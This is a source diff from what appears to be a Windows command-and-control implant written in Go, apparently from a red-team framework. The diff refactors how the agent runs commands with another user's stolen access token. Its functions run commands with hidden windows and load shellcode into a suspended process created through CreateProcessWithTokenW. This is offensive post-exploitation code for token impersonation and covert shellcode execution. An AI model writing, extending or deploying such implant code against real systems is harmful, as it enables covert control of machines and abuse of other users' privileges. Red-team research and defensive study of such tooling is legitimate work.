@@ -78,8 +78,8 @@ const (
 // executeCommand is function used to instruct an agent to execute a command on the host operating system
 func executeCommand(name string, args []string) (stdout string, stderr string) {
 	// If agent has another user's access token, switch to Windows API call
-	if windowsToken != 0 {
-		return tokens.CreateProcessWithToken(windowsToken, name, args)
+	if tokens.Token != 0 {
+		return tokens.CreateProcessWithToken(tokens.Token, name, args)
 	}
 
 	cmd := exec.Command(name, args...)
@@ -87,8 +87,8 @@ func executeCommand(name string, args []string) (stdout string, stderr string) {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go
 
 	out, err := cmd.CombinedOutput()
-	stdout = string(out)
-	stderr = ""
+	stdout = fmt.Sprintf("Created %s process with an ID of %d\n", name, cmd.Process.Pid)
+	stdout += string(out)
 
 	if err != nil {
 		stderr = err.Error()
@@ -450,9 +450,7 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 		ShowWindow: windows.SW_HIDE,
 	}
 
-	if windowsToken != 0 {
-		LOGON_NETCREDENTIALS_ONLY := uint32(0x2) // Could not find this constant in the windows package
-		dwLogonFlags := LOGON_NETCREDENTIALS_ONLY
+	if tokens.Token != 0 {
 		// BOOL CreateProcessWithTokenW(
 		//  [in]                HANDLE                hToken,
 		//  [in]                DWORD                 dwLogonFlags,
@@ -465,8 +463,8 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 		//  [out]               LPPROCESS_INFORMATION lpProcessInformation
 		//);
 		err = advapi32.CreateProcessWithTokenW(
-			uintptr(windowsToken),
-			uintptr(dwLogonFlags),
+			uintptr(tokens.Token),
+			uintptr(tokens.LOGON_NETCREDENTIALS_ONLY),
 			uintptr(unsafe.Pointer(lpApplicationName)),
 			uintptr(unsafe.Pointer(lpCommandLine)),
 			uintptr(windows.CREATE_SUSPENDED),
